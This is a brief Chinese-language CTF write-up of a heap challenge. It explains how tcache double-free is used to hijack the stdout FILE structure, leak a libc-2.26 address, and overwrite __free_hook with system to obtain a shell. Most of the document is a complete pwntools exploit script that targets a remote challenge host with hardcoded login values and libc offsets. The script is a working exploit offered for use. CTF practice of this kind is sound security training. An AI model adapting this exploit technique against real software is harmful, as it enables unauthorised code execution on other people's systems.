远程测试，发现有tcache机制

于是malloc到stdout结构体，去改头，然后leak出libc地址，找了下，发现是libc-2.26的

leak那一步可以看angleboy的slide

https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique

然后再利用tcache的漏洞，写__free_hook为system，free掉之后直接get shell

下面是payload

```
from pwn import *

debug=0

context.log_level='debug'

if debug:
    p=process('./pwn')
    #p=process('',env={'LD_PRELOAD':'./libc.so'})
    gdb.attach(p)
    e=ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
else:
    p=remote('90b826377a05d5e9508314e76f2f1e4e.kr-lab.com', 40001)
    e=ELF('./libc6_2.26-0ubuntu2_amd64.so')

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)

ru('username:')
se('admin\n')
ru('password:')
se('frame\n')
ru('>')

def add(name,sz,content):
    sl('1')
    ru('name')
    se(name)
    ru('size:')
    sl(str(sz))
    ru('description:')
    se(content)
    return ru('>')

def delete(idx):
    sl('2')
    ru('index:')
    sl(str(idx))
    ru('>')

sz = 0x88
add('0',sz,'123')

for i in range(4):
    delete(0)

add('1',sz,p64(0x602020))
add('2',sz,'123')
if debug:
    add('3',sz,'\x60')
    data = add('4',sz,p64(0xfbad1800)+p64(0)*3+'\x80')
    libc = u64(data[:8])
    base = libc - 0x3EC780
else:
    add('3',sz,'\x20')
    data = add('4',sz,p64(0xfbad1800)+p64(0)*3+'\x40')
    libc = u64(data[:8]) 
    base = libc - 0x3db720 - 0x20

add('5',0x68,'/bin/sh')
delete(5)
delete(5)
delete(5)

free_hook = base+e.symbols['__free_hook']
system = base+e.symbols['system']

add('6',0x68,p64(free_hook))
add('7',0x68,'/bin/sh\x00')
add('8',0x68,p64(system))

sl('2')
ru('index')
sl('7')

print(hex(base))

p.interactive()

```